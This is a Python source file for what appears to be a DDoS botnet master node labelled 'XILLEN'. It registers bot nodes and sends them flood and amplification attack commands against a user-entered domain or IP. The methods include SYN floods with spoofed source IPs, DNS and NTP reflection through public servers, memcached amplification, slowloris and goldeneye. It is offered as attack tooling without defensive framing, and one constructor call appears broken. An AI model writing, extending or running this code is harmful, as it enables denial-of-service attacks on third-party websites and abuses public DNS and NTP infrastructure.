#!/usr/bin/env python3
import socket
import threading
import time
import json
import random
import os
import sys
import signal
from datetime import datetime
import colorama
from colorama import Fore, Back, Style
import logging
import subprocess
import platform
import psutil
import requests
import dns.resolver
import ipaddress
from urllib.parse import urlparse
import asyncio
import aiohttp
import aiofiles

colorama.init()

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    END = Style.RESET_ALL

class BotNode:
    def __init__(self, node_id, ip, port, status="online"):
        self.node_id = node_id
        self.ip = ip
        self.port = port
        self.status = status
        self.last_seen = datetime.now()
        self.requests_sent = 0
        self.errors = 0
        self.cpu_usage = 0
        self.memory_usage = 0
        self.bandwidth = 0
        self.attack_methods = []
        self.max_threads = 100
        self.current_load = 0

class AttackCommand:
    def __init__(self, command_id, attack_type, target, port, duration, threads, payload=None):
        self.command_id = command_id
        self.attack_type = attack_type
        self.target = target
        self.target_ip = None
        self.port = port
        self.duration = duration
        self.threads = threads
        self.payload = payload
        self.status = "pending"
        self.start_time = None
        self.end_time = None
        self.total_requests = 0
        self.total_errors = 0
        self.assigned_nodes = []

class MasterNode:
    def __init__(self):
        self.nodes = {}
        self.commands = {}
        self.running = False
        self.command_socket = None
        self.control_port = 1337
        self.command_port = 1338
        self.setup_logging()
        self.setup_sockets()
        self.command_counter = 0
        self.total_requests = 0
        self.total_errors = 0
        self.attack_methods = {
            "http_flood": self.http_flood_command,
            "tcp_flood": self.tcp_flood_command,
            "udp_flood": self.udp_flood_command,
            "syn_flood": self.syn_flood_command,
            "icmp_flood": self.icmp_flood_command,
            "dns_amplification": self.dns_amplification_command,
            "ntp_amplification": self.ntp_amplification_command,
            "memcached_amplification": self.memcached_amplification_command,
            "ssdp_reflection": self.ssdp_reflection_command,
            "chargen_reflection": self.chargen_reflection_command,
            "slowloris": self.slowloris_command,
            "goldeneye": self.goldeneye_command,
            "mixed_attack": self.mixed_attack_command
        }
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('master_node.log', encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('MasterNode')
        
    def setup_sockets(self):
        try:
            self.command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.command_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.command_socket.bind(('0.0.0.0', self.command_port))
            self.command_socket.listen(100)
            self.logger.info(f"Command socket listening on port {self.command_port}")
        except Exception as e:
            self.logger.error(f"Failed to setup sockets: {e}")
            
    def resolve_target(self, target):
        try:
            if ipaddress.ip_address(target):
                return target
        except:
            pass
            
        try:
            result = dns.resolver.resolve(target, 'A')
            return str(result[0])
        except:
            return target
            
    def register_node(self, node_data):
        node_id = node_data.get('node_id')
        ip = node_data.get('ip')
        port = node_data.get('port')
        capabilities = node_data.get('capabilities', [])
        
        node = BotNode(node_id, ip, port)
        node.attack_methods = capabilities
        node.max_threads = node_data.get('max_threads', 100)
        
        self.nodes[node_id] = node
        self.logger.info(f"Node {node_id} registered from {ip}:{port}")
        return {"status": "registered", "node_id": node_id}
        
    def create_attack_command(self, attack_type, target, port, duration, threads, payload=None):
        self.command_counter += 1
        command_id = f"CMD_{self.command_counter:06d}"
        
        target_ip = self.resolve_target(target)
        
        command = AttackCommand(
            command_id=command_id,
            attack_type=attack_type,
            target=target,
            target_ip=target_ip,
            port=port,
            duration=duration,
            threads=threads,
            payload=payload
        )
        
        self.commands[command_id] = command
        return command_id
        
    def distribute_command(self, command_id):
        command = self.commands[command_id]
        available_nodes = [node for node in self.nodes.values() if node.status == "online"]
        
        if not available_nodes:
            self.logger.warning("No available nodes for command distribution")
            return False
            
        threads_per_node = command.threads // len(available_nodes)
        remaining_threads = command.threads % len(available_nodes)
        
        for i, node in enumerate(available_nodes):
            node_threads = threads_per_node
            if i < remaining_threads:
                node_threads += 1
                
            if node_threads > 0:
                command.assigned_nodes.append({
                    "node_id": node.node_id,
                    "threads": node_threads,
                    "status": "assigned"
                })
                
        return True
        
    def http_flood_command(self, command):
        payload = {
            "method": "http_flood",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ],
            "paths": ["/", "/index.html", "/api", "/admin", "/login"],
            "headers": {
                "X-Forwarded-For": "random",
                "X-Real-IP": "random",
                "X-Client-IP": "random"
            }
        }
        return payload
        
    def tcp_flood_command(self, command):
        payload = {
            "method": "tcp_flood",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "packet_size": 1024,
            "connection_timeout": 3
        }
        return payload
        
    def udp_flood_command(self, command):
        payload = {
            "method": "udp_flood",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "packet_size": 1024,
            "packet_count": 1000
        }
        return payload
        
    def syn_flood_command(self, command):
        payload = {
            "method": "syn_flood",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "packet_size": 64,
            "source_ip_spoofing": True
        }
        return payload
        
    def icmp_flood_command(self, command):
        payload = {
            "method": "icmp_flood",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "packet_size": 32,
            "icmp_type": 8
        }
        return payload
        
    def dns_amplification_command(self, command):
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "208.67.222.222", "208.67.220.220", "9.9.9.9"
        ]
        
        payload = {
            "method": "dns_amplification",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "dns_servers": dns_servers,
            "query_domains": [
                "isc.org", "google.com", "cloudflare.com",
                "amazon.com", "microsoft.com", "apple.com"
            ],
            "amplification_factor": 50
        }
        return payload
        
    def ntp_amplification_command(self, command):
        ntp_servers = [
            "pool.ntp.org", "time.nist.gov", "time.windows.com",
            "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org"
        ]
        
        payload = {
            "method": "ntp_amplification",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "ntp_servers": ntp_servers,
            "amplification_factor": 200
        }
        return payload
        
    def memcached_amplification_command(self, command):
        memcached_servers = [
            "127.0.0.1:11211", "0.0.0.0:11211"
        ]
        
        payload = {
            "method": "memcached_amplification",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "memcached_servers": memcached_servers,
            "amplification_factor": 10000
        }
        return payload
        
    def ssdp_reflection_command(self, command):
        payload = {
            "method": "ssdp_reflection",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "ssdp_query": "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nST: upnp:rootdevice\r\n\r\n",
            "amplification_factor": 30
        }
        return payload
        
    def chargen_reflection_command(self, command):
        payload = {
            "method": "chargen_reflection",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "chargen_query": "?",
            "amplification_factor": 100
        }
        return payload
        
    def slowloris_command(self, command):
        payload = {
            "method": "slowloris",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "max_connections": 200,
            "keep_alive_timeout": 10
        }
        return payload
        
    def goldeneye_command(self, command):
        payload = {
            "method": "goldeneye",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            ],
            "paths": ["/", "/index.html", "/api", "/admin"],
            "random_headers": True
        }
        return payload
        
    def mixed_attack_command(self, command):
        payload = {
            "method": "mixed_attack",
            "target": command.target_ip,
            "port": command.port,
            "threads": command.threads,
            "duration": command.duration,
            "attack_methods": [
                "http_flood", "tcp_flood", "udp_flood", "syn_flood"
            ],
            "method_rotation": 5
        }
        return payload
        
    def execute_attack(self, command_id):
        command = self.commands[command_id]
        
        if command.attack_type not in self.attack_methods:
            self.logger.error(f"Unknown attack type: {command.attack_type}")
            return False
            
        payload = self.attack_methods[command.attack_type](command)
        
        if not self.distribute_command(command_id):
            return False
            
        command.status = "executing"
        command.start_time = datetime.now()
        
        for node_assignment in command.assigned_nodes:
            node_id = node_assignment["node_id"]
            if node_id in self.nodes:
                node = self.nodes[node_id]
                node.current_load += node_assignment["threads"]
                
                command_data = {
                    "command_id": command_id,
                    "attack_type": command.attack_type,
                    "payload": payload,
                    "threads": node_assignment["threads"]
                }
                
                self.send_command_to_node(node, command_data)
                
        return True
        
    def send_command_to_node(self, node, command_data):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((node.ip, node.port))
            
            message = json.dumps(command_data).encode('utf-8')
            sock.send(message)
            sock.close()
            
            self.logger.info(f"Command sent to node {node.node_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to send command to node {node.node_id}: {e}")
            return False
            
    def handle_node_communication(self, client_socket, address):
        try:
            data = client_socket.recv(4096).decode('utf-8')
            message = json.loads(data)
            
            message_type = message.get('type')
            
            if message_type == 'register':
                response = self.register_node(message)
                client_socket.send(json.dumps(response).encode('utf-8'))
                
            elif message_type == 'status_update':
                node_id = message.get('node_id')
                if node_id in self.nodes:
                    node = self.nodes[node_id]
                    node.status = message.get('status', 'online')
                    node.last_seen = datetime.now()
                    node.requests_sent += message.get('requests_sent', 0)
                    node.errors += message.get('errors', 0)
                    node.cpu_usage = message.get('cpu_usage', 0)
                    node.memory_usage = message.get('memory_usage', 0)
                    node.bandwidth = message.get('bandwidth', 0)
                    
            elif message_type == 'command_response':
                command_id = message.get('command_id')
                if command_id in self.commands:
                    command = self.commands[command_id]
                    command.total_requests += message.get('requests_sent', 0)
                    command.total_errors += message.get('errors', 0)
                    
        except Exception as e:
            self.logger.error(f"Error handling node communication: {e}")
        finally:
            client_socket.close()
            
    def command_listener(self):
        while self.running:
            try:
                client_socket, address = self.command_socket.accept()
                thread = threading.Thread(
                    target=self.handle_node_communication,
                    args=(client_socket, address)
                )
                thread.daemon = True
                thread.start()
            except Exception as e:
                if self.running:
                    self.logger.error(f"Command listener error: {e}")
                    
    def display_status(self):
        while self.running:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print(f"{Colors.RED}{Colors.BOLD}")
            print("╔══════════════════════════════════════════════════════════════╗")
            print("║                    XILLEN DDoS MASTER NODE                   ║")
            print("║                                                              ║")
            print("║  ██╗  ██╗██╗██╗     ██╗     ███████╗███╗   ██╗            ║")
            print("║  ╚██╗██╔╝██║██║     ██║     ██╔════╝████╗  ██║            ║")
            print("║   ╚███╔╝ ██║██║     ██║     █████╗  ██╔██╗ ██║            ║")
            print("║   ██╔██╗ ██║██║     ██║     ██╔══╝  ██║╚██╗██║            ║")
            print("║  ██╔╝ ██╗██║███████╗███████╗███████╗██║ ╚████║            ║")
            print("║  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝            ║")
            print("║                                                              ║")
            print("║              DISTRIBUTED DENIAL OF SERVICE                  ║")
            print("║                                                              ║")
            print("║  Author: t.me/Bengamin_Button | t.me/XillenAdapter          ║")
            print("╚══════════════════════════════════════════════════════════════╝")
            print(f"{Colors.END}")
            
            print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.CYAN}{Colors.BOLD}║                    SYSTEM STATUS                           ║{Colors.END}")
            print(f"{Colors.CYAN}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
            
            online_nodes = len([n for n in self.nodes.values() if n.status == "online"])
            total_nodes = len(self.nodes)
            active_commands = len([c for c in self.commands.values() if c.status == "executing"])
            
            print(f"{Colors.GREEN}Online Nodes: {Colors.WHITE}{online_nodes}/{total_nodes}{Colors.END}")
            print(f"{Colors.GREEN}Active Commands: {Colors.WHITE}{active_commands}{Colors.END}")
            print(f"{Colors.GREEN}Total Requests: {Colors.WHITE}{self.total_requests:,}{Colors.END}")
            print(f"{Colors.GREEN}Total Errors: {Colors.WHITE}{self.total_errors:,}{Colors.END}")
            
            print(f"\n{Colors.YELLOW}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.YELLOW}{Colors.BOLD}║                    CONNECTED NODES                        ║{Colors.END}")
            print(f"{Colors.YELLOW}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
            
            for node in self.nodes.values():
                status_color = Colors.GREEN if node.status == "online" else Colors.RED
                print(f"{status_color}{node.node_id:15} {node.ip:15} {node.status:8} {node.requests_sent:8,} {node.errors:6,}{Colors.END}")
                
            print(f"\n{Colors.MAGENTA}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.MAGENTA}{Colors.BOLD}║                    ACTIVE COMMANDS                         ║{Colors.END}")
            print(f"{Colors.MAGENTA}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
            
            for command in self.commands.values():
                if command.status == "executing":
                    elapsed = (datetime.now() - command.start_time).total_seconds()
                    print(f"{Colors.WHITE}{command.command_id:12} {command.attack_type:15} {command.target:20} {elapsed:6.1f}s{Colors.END}")
                    
            print(f"\n{Colors.RED}{Colors.BOLD}Press Ctrl+C to stop{Colors.END}")
            time.sleep(2)
            
    def interactive_mode(self):
        while self.running:
            try:
                print(f"\n{Colors.GREEN}Master Node Commands:{Colors.END}")
                print(f"{Colors.CYAN}1. Launch Attack{Colors.END}")
                print(f"{Colors.CYAN}2. List Nodes{Colors.END}")
                print(f"{Colors.CYAN}3. List Commands{Colors.END}")
                print(f"{Colors.CYAN}4. Stop Command{Colors.END}")
                print(f"{Colors.CYAN}5. Exit{Colors.END}")
                
                choice = input(f"\n{Colors.GREEN}Select option: {Colors.END}")
                
                if choice == "1":
                    self.launch_attack_interactive()
                elif choice == "2":
                    self.list_nodes()
                elif choice == "3":
                    self.list_commands()
                elif choice == "4":
                    self.stop_command_interactive()
                elif choice == "5":
                    self.running = False
                    break
                    
            except KeyboardInterrupt:
                self.running = False
                break
            except Exception as e:
                self.logger.error(f"Interactive mode error: {e}")
                
    def launch_attack_interactive(self):
        print(f"\n{Colors.YELLOW}{Colors.BOLD}Attack Configuration{Colors.END}")
        
        print(f"\n{Colors.CYAN}Available Attack Methods:{Colors.END}")
        methods = list(self.attack_methods.keys())
        for i, method in enumerate(methods, 1):
            print(f"{Colors.WHITE}{i:2}. {method}{Colors.END}")
            
        method_choice = input(f"\n{Colors.GREEN}Select attack method (1-{len(methods)}): {Colors.END}")
        try:
            attack_type = methods[int(method_choice) - 1]
        except:
            print(f"{Colors.RED}Invalid choice!{Colors.END}")
            return
            
        target = input(f"{Colors.GREEN}Enter target (domain/IP): {Colors.END}")
        port = int(input(f"{Colors.GREEN}Enter port (default 80): {Colors.END}") or "80")
        duration = int(input(f"{Colors.GREEN}Enter duration in seconds (default 60): {Colors.END}") or "60")
        threads = int(input(f"{Colors.GREEN}Enter total threads (default 1000): {Colors.END}") or "1000")
        
        command_id = self.create_attack_command(attack_type, target, port, duration, threads)
        
        print(f"\n{Colors.YELLOW}Launching attack {command_id}...{Colors.END}")
        
        if self.execute_attack(command_id):
            print(f"{Colors.GREEN}Attack launched successfully!{Colors.END}")
        else:
            print(f"{Colors.RED}Failed to launch attack!{Colors.END}")
            
    def list_nodes(self):
        print(f"\n{Colors.CYAN}{Colors.BOLD}Connected Nodes:{Colors.END}")
        for node in self.nodes.values():
            status_color = Colors.GREEN if node.status == "online" else Colors.RED
            print(f"{status_color}{node.node_id:15} {node.ip:15} {node.status:8} {node.requests_sent:8,} {node.errors:6,}{Colors.END}")
            
    def list_commands(self):
        print(f"\n{Colors.CYAN}{Colors.BOLD}Active Commands:{Colors.END}")
        for command in self.commands.values():
            if command.status == "executing":
                elapsed = (datetime.now() - command.start_time).total_seconds()
                print(f"{Colors.WHITE}{command.command_id:12} {command.attack_type:15} {command.target:20} {elapsed:6.1f}s{Colors.END}")
                
    def stop_command_interactive(self):
        command_id = input(f"{Colors.GREEN}Enter command ID to stop: {Colors.END}")
        if command_id in self.commands:
            self.commands[command_id].status = "stopped"
            print(f"{Colors.GREEN}Command {command_id} stopped!{Colors.END}")
        else:
            print(f"{Colors.RED}Command not found!{Colors.END}")
            
    def run(self):
        self.running = True
        
        print(f"{Colors.GREEN}Starting Master Node...{Colors.END}")
        print(f"{Colors.GREEN}Command port: {self.command_port}{Colors.END}")
        
        command_thread = threading.Thread(target=self.command_listener)
        command_thread.daemon = True
        command_thread.start()
        
        status_thread = threading.Thread(target=self.display_status)
        status_thread.daemon = True
        status_thread.start()
        
        self.interactive_mode()
        
        self.running = False
        if self.command_socket:
            self.command_socket.close()
            
        print(f"{Colors.GREEN}Master Node stopped!{Colors.END}")

def signal_handler(sig, frame):
    print(f"\n{Colors.RED}{Colors.BOLD}Shutting down Master Node...{Colors.END}")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        master = MasterNode()
        master.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}{Colors.BOLD}Master Node stopped!{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Error: {e}{Colors.END}")